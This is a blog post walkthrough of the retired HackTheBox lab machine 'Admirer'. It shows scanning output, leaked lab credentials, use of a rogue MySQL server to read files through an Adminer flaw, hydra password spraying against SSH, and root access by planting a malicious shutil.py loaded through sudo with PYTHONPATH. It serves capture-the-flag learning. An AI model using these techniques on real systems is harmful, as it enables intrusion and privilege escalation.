
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="This is a writeup about a retired HacktheBox machine: Admirer created by polarbearer and GibParadox and publish on May 2, 2020. This box is classified as an easy machine. The user part implied a few enumeration and an adminer vulnerability. The root part implied a sudo permission with SETENV and a python script." name="description"/>
<meta content="security, boot2root, HTB, adminer, Linux, sudo" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Admirer" property="og:title"/>
<meta content="This is a writeup about a retired HacktheBox machine: Admirer created by polarbearer and GibParadox and publish on May 2, 2020. This box is classified as an easy machine. The user part implied a few enumeration and an adminer vulnerability. The root part implied a sudo permission with SETENV and a python script." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2020/09/htb-admirer.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2020-09-27 08:30:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="adminer" property="article:tag"/>
<meta content="Linux" property="article:tag"/>
<meta content="sudo" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Admirer</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-admirer">HTB: Admirer</h1>
<p>
      Posted on 27 Sep 2020 in <a href="../../category/security.html">security</a>

        • 5 min read
    </p>
</header>
<div>
<p><img alt="Admirer card" class="align-left" src="/media/2020.09/admirer_card.png" width="262"/></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/248">Admirer</a> created by
<a href="https://www.hackthebox.com/home/users/profile/159204">polarbearer</a> and
<a href="https://www.hackthebox.com/home/users/profile/125033">GibParadox</a> and publish on
May 2, 2020.
This box is classified as an easy machine. The user part implied a few
enumeration and an adminer vulnerability.
The root part implied a sudo permission with SETENV and a python script.</p>
<h1>User</h1>
<h2>Recon</h2>
<p>We start with an nmap scan. Only the ports 21(FTP), 22 (SSH) and 80 (HTTP) are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Mon May  4 11:30:21 2020 as: nmap -p- -sS -oN nmap 10.10.10.187
Nmap scan report for 10.10.10.187
Host is up (0.020s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Mon May  4 11:39:02 2020 -- 1 IP address (1 host up) scanned in 520.65 seconds
</code></pre></div>
<h2>FTP</h2>
<p>The ftp service doesn't allow anonymous connections.</p>
<h2>Web</h2>
<p>The home web page is a collection of picture.</p>
<p><img alt="Home page" class="image-process-article-image" src="/media/2020.09/derivatives/article-image/admirer_01.png"/></p>
<p>We look at the <code>robot.txt</code> file, it contains the location of some <code>admin-dir</code>
directory supposed to contain some credentials.</p>
<div class="highlight"><pre><span></span><code>User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
</code></pre></div>
<p>We try a few filename like <code>passwords.txt</code>, <code>creds.txt</code>… <code>credentials.txt</code> works
and give use a few usernames and password for some services including ftp.</p>
<div class="highlight"><pre><span></span><code>[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
</code></pre></div>
<h2>Back to the FTP</h2>
<p>We connect to the FTP account using the creds. This allow us to get a SQL dump
(nothing interesting in it) and an archive of the web site. This archive give
show the existence of an interesting directory <code>utility-scripts</code>. It also give
use credentials for a MySQL database in the <code>db_connect.php</code> file.
The comment at the end of the file <code>// TODO: Finish implementing this or find a better open source alternative</code>
is also an hint for the next part.</p>
<p><img alt="FTP page" class="image-process-article-image" src="/media/2020.09/derivatives/article-image/admirer_03.png"/></p>
<h2>Back to the web</h2>
<p>We use <code>dirb</code> on the <code>utility-scripts</code> directory. As we know that the
application is using php we add the <code>.php</code> extension. The tool discover the page
<code>adminer.php</code>.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~/pown/htb_admirer$ dirb http://10.10.10.187/utility-scripts/  /usr/share/wordlists/dirb/big.txt -X .php

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue May  5 05:55:58 2020
URL_BASE: http://10.10.10.187/utility-scripts/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 20458

---- Scanning URL: http://10.10.10.187/utility-scripts/ ----
+ http://10.10.10.187/utility-scripts/adminer.php (CODE:200|SIZE:4295)
</code></pre></div>
<h2>Adminer</h2>
<p><a href="https://www.adminer.org/">Adminer</a> is a tools to manage your database directly
from your browser. It is a <a href="https://www.phpmyadmin.net/">phpmyadmin</a>
alternative.</p>
<p>Obviously we land on a login page. The previously found credentials doesn't work.
But looking at the page, we see that the used version is "4.6.2" and that the
last version is "4.7.6".</p>
<p><img alt="adminer page" class="image-process-article-image" src="/media/2020.09/derivatives/article-image/admirer_02.png"/></p>
<p>We Google for "adminer 4.6.2 exploit" and found an article about a
<a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">serious vulnerability in adminer tool</a></p>
<p>We just need a <a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue MySql Server</a>.
We launch it and start getting some files. We try <code>db_connect.php</code> but the file
was obviously replace by <code>adminer.php</code>. We can retrieve <code>adminier.php</code> just to
be sure that our exploit is working. Then we just retrieve <code>../index.php</code> which
contain the new creds for the database.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~/Rogue-MySql-Server$ php roguemysql.php
Enter filename to get [db_connect.php] &gt; ../index.php
[.] Waiting for connection on 0.0.0.0:3306
[+] Connection from 10.10.10.187:47566 - greet... auth ok... some shit ok... want file...
[+] ../index.php from 10.10.10.187:47566:
&lt;!DOCTYPE HTML&gt;
&lt;!--
        Multiverse by HTML5 UP
        html5up.net | @ajlkn
        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
--&gt;
&lt;html&gt;
        &lt;head&gt;
                &lt;title&gt;Admirer&lt;/title&gt;
                &lt;meta charset="utf-8" /&gt;
                &lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;
                &lt;link rel="stylesheet" href="assets/css/main.css" /&gt;
                &lt;noscript&gt;&lt;link rel="stylesheet" href="assets/css/noscript.css" /&gt;&lt;/noscript&gt;
        &lt;/head&gt;
        &lt;body class="is-preload"&gt;

                &lt;!-- Wrapper --&gt;
                        &lt;div id="wrapper"&gt;

                                &lt;!-- Header --&gt;
                                        &lt;header id="header"&gt;
                                                &lt;h1&gt;&lt;a href="index.html"&gt;&lt;strong&gt;Admirer&lt;/strong&gt; of skills and visuals&lt;/a&gt;&lt;/h1&gt;
                                                &lt;nav&gt;
                                                        &lt;ul&gt;
                                                                &lt;li&gt;&lt;a href="#footer" class="icon solid fa-info-circle"&gt;About&lt;/a&gt;&lt;/li&gt;
                                                        &lt;/ul&gt;
                                                &lt;/nav&gt;
                                        &lt;/header&gt;

                                &lt;!-- Main --&gt;
                                        &lt;div id="main"&gt;
                                        &lt;?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;";
                        $dbname = "admirerdb";
</code></pre></div>
<p>We can then connect to the local database with adminer but there is nothing
interesting there.</p>
<p>I have the habit to create two files <code>user</code> and <code>passwd</code> containing the looted
data. We use <code>hydra</code> to test the gather creds against the ssh service. The last
password found is a valid SSH password for the <code>waldo</code> user.</p>
<div class="highlight"><pre><span></span><code>$ hydra -L user -P passwd ssh://10.10.10.187
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-05 05:22:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries (l:11/p:6), ~5 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
[22][ssh] host: 10.10.10.187   login: waldo   password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-05 05:22:17
</code></pre></div>
<p>We can then connect to ssh and get the user flag.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~/pown/htb_admirer/loot/html$ ssh waldo@10.10.10.187
waldo@10.10.10.187's password:
&lt;SNIP&gt;
waldo@admirer:~$ cat user.txt
fea0c3468144ce6091631cfbfb6c81eb
</code></pre></div>
<h1>Way to root</h1>
<p>With our ssh connection with start to enumerate the box. The first thing we
notice is that we have the sudo permission to execute
<code>/opt/scripts/admin_tasks.sh</code> with the <code>SETENV</code> flag. Which means that our
environmental variable will be preserved.</p>
<div class="highlight"><pre><span></span><code>waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
</code></pre></div>
<p>When looking at the script we see a few interesting blocks.</p>
<p>The first interesting part is the <code>backup_shadow</code> function. I tried some race
condition between the moment the file is backuped and not yet <code>chown</code> to root.
But that is not working.</p>
<div class="highlight"><pre><span></span><code>backup_shadow<span class="o">()</span>
<span class="o">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span>
<span class="w">    </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
<span class="w">        </span>/bin/cp<span class="w"> </span>/etc/shadow<span class="w"> </span>/var/backups/shadow.bak
<span class="w">        </span>/bin/chown<span class="w"> </span>root:shadow<span class="w"> </span>/var/backups/shadow.bak
<span class="w">        </span>/bin/chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>/var/backups/shadow.bak
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Done."</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Insufficient privileges to perform the selected operation."</span>
<span class="w">    </span><span class="k">fi</span>
<span class="o">}</span>
</code></pre></div>
<p>The next one is the <code>backup_web</code> function as this call an external python
script.</p>
<div class="highlight"><pre><span></span><code>backup_web<span class="o">()</span>
<span class="o">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span>
<span class="w">    </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Running backup script in the background, it might take a while..."</span>
<span class="w">        </span>/opt/scripts/backup.py<span class="w"> </span><span class="p">&amp;</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Insufficient privileges to perform the selected operation."</span>
<span class="w">    </span><span class="k">fi</span>
<span class="o">}</span>
</code></pre></div>
<p>The python script import the <code>make_archive</code> function from <code>shutil</code>. And then
create a <code>tar.gz</code> archive from <code>/var/www/hml</code>.</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>

<span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>

<span class="n">src</span> <span class="o">=</span> <span class="s1">'/var/www/html/'</span>

<span class="c1"># old ftp directory, not used anymore</span>
<span class="c1">#dst = '/srv/ftp/html'</span>

<span class="n">dst</span> <span class="o">=</span> <span class="s1">'/var/backups/html'</span>

<span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">'gztar'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
</code></pre></div>
<p>As we can export our environmental variable to <code>sudo</code>, we can rewrote the
<code>shutil</code> module to execute the code we want. We wrote a specific <code>shutil.py</code> script:</p>
<div class="highlight"><pre><span></span><code>    :::text
    def make_archive(a,b,c):
        print('ok')
        with open('/root/root.txt') as f:
            with open('/tmp/plop/flag.txt', 'w') as g:
                g.write(f.read())
</code></pre></div>
<p>And run the web backup with specifying our <code>PYTHONPATH</code> environment variable.</p>
<div class="highlight"><pre><span></span><code>waldo@admirer:/tmp/plop$ sudo PYTHONPATH=/tmp/plop /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:/tmp/plop$ ok
cat flag.txt
6bd44137e00395497fefe44684913599
</code></pre></div>
<h1>Wrapping up</h1>
<p>The box was a combination of simple techniques. As the exposed surface was
really small (FTP, SSH and HTTP) there was not a lot of rabbit hole during
exploration. I am a bit mad that the "exploit" for adminer was not in
<code>searchsploit</code> as I lost some time before putting the search into Google.</p>
<p>The root part was quit simple if you know already know the issue.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/adminer.html">adminer</a>
<a href="../../tag/linux.html">Linux</a>
<a href="../../tag/sudo.html">sudo</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2020/08/htb-magic.html" title="HTB: Magic">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2020/10/htb-cache.html" title="HTB: Cache">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>